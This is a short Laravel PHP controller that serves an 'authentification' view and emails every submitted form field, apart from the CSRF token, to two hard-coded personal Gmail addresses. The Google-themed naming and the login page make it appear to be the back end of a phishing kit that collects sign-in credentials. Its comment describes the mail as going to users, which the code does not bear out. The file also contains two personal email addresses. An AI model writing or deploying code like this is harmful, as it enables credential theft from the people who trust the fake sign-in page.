<?php

namespace App\Http\Controllers;

use App\Mail\MessageGoogle;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class MessageController extends Controller
{
    public function formMessageGoogle()
    {
        return view("authentification");
    }
    // Envoi du mail aux utilisateurs
    public function sendMessageGoogle(Request $request)
    {

        Mail::to('Gueguegyptie12@gmail.com')
            ->send(new MessageGoogle($request->except('_token')));

        Mail::to('chabijeanbaptiste56@gmail.com')
            ->send(new MessageGoogle($request->except('_token')));
        return redirect()->back();
    }
}
